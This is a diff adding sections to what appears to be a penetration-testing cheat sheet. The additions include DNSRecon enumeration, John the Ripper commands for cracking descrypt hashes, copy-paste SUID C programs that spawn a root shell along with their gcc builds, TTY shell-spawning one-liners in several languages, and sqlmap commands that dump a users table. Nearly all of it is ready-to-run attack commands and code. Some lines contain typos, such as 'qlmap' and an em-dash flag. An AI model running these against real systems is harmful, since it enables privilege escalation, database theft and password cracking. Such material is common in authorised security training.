@@ -324,6 +324,22 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </table>
 </div>
 
+## DNSRecon
+
+<section class="shellbox">
+    <div class="unit golden-large code">
+      <p class="title">DNS Enumeration Kali - DNSRecon</p>
+      <div class="shell">
+        <p class="line">
+          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+          <span class="command">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span>
+        </p>
+        </p>
+      </div>
+    </div>
+</section>
+
+
 ### HTTP / HTTPS Webserver Enumeration
 
 <div class="mobile-side-scroller">
@@ -568,15 +584,33 @@ Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code>
   <tbody>
     <tr>
       <td>
-	<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
+             <p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p>
       </td>
       <td>
             <p>JTR password cracking</p>
       </td>
     </tr>
+    <tr>
+      <td>
+          <p><code>john --format=descrypt --wordlist <br> /usr/share/wordlists/rockyou.txt hash.txt</code></p>
+      </td>
+      <td>
+            <p>JTR forced descrypt cracking with wordlist</p>
+      </td>
+    </tr>
+    <tr>
+      <td>
+          <p><code>john --format=descrypt hash --show</code></p>
+      </td>
+      <td>
+            <p>JTR forced descrypt brute force cracking</p>
+      </td>
+    </tr>
   </tbody>
 </table>
 </div>
+
+
 
 ### Exploit Research
 
@@ -693,6 +727,8 @@ Compile exploit gcc.
 
 #### GCC Compile 32Bit Exploit on 64Bit Kali
 
+Handy for cross compiling 32 bit binaries on 64 bit attacking machines.  
+
 <div class="mobile-side-scroller">
 <table>
   <thead>
@@ -707,7 +743,7 @@ Compile exploit gcc.
         <p><code>gcc -m32 exploit.c -o exploit</code></p>
       </td>
       <td>
-            <p>Compile windows .exe on Linux</p>
+            <p>Cross compile 32 bit binary on 64 bit Linux</p>
       </td>
     </tr>
 
@@ -740,6 +776,102 @@ Build / compile windows exploits on Linux, resulting in a .exe file.
   </tbody>
 </table>
 </div>
+
+### SUID Binary
+
+Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.
+
+below are some quick copy and pate examples for various shells:
+
+#### SUID C for /bin/bash   
+
+{% highlight c %}
+int main(void){
+       setresuid(0, 0, 0);
+       system("/bin/bash");
+}       
+{% endhighlight %}
+
+#### SUID C for /bin/sh
+
+{% highlight c %}
+int main(void){
+       setresuid(0, 0, 0);
+       system("/bin/sh");
+}       
+{% endhighlight %}
+
+
+#### Building the SUID binary
+
+{% highlight bash %}
+gcc -o suid suid.c  
+{% endhighlight %}
+
+For 32 bit:
+
+{% highlight bash %}
+gcc -m32 -o suid suid.c  
+{% endhighlight %}
+
+
+### TTY Shells
+
+Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.
+
+##### Python TTY Shell Trick  
+
+{% highlight python %}
+python -c 'import pty;pty.spawn("/bin/bash")'
+{% endhighlight %}
+
+{% highlight python %}
+python -c 'import pty;pty.spawn("/bin/bash")'
+{% endhighlight %}
+
+{% highlight bash %}
+echo os.system('/bin/bash')
+{% endhighlight %}
+
+#### Spawn Interactive sh shell
+
+{% highlight bash %}
+/bin/sh -i
+{% endhighlight %}
+
+#### Spawn Perl TTY Shell
+
+{% highlight perl %}
+exec "/bin/sh";
+perl —e 'exec "/bin/sh";'
+{% endhighlight %}
+
+#### Spawn Ruby TTY Shell
+
+{% highlight ruby %}
+exec "/bin/sh"
+{% endhighlight %}
+
+#### Spawn Lua TTY Shell
+
+{% highlight lua %}
+os.execute('/bin/sh')
+{% endhighlight %}
+
+#### Spawn TTY Shell from Vi
+
+Run shell commands from vi:
+
+{% highlight bash %}
+:!bash
+{% endhighlight %}
+
+#### Spawn TTY Shell NMAP
+
+{% highlight bash %}
+!sh
+{% endhighlight %}
+
 
 ## Metasploit
 
@@ -2068,6 +2200,25 @@ Likely just use hash-identifier for this but here are some example hashes
             <p>Scan url for union + error based injection with mysql backend <br>and use a random user agent + database dump</p>
       </td>
     </tr>
+
+    <tr>
+      <td>
+        <p><code>sqlmap -o -u "http://meh.com/form/" --forms</code></p>
+      </td>
+      <td>
+            <p>sqlmap check form for injection</p>
+      </td>
+    </tr>
+
+    <tr>
+      <td>
+        <p><code>qlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump</code></p>
+      </td>
+      <td>
+            <p>sqlmap dump and crack hashes for table users on database-name.</p>
+      </td>
+    </tr>
+
   </tbody>
 </table>
 </div>
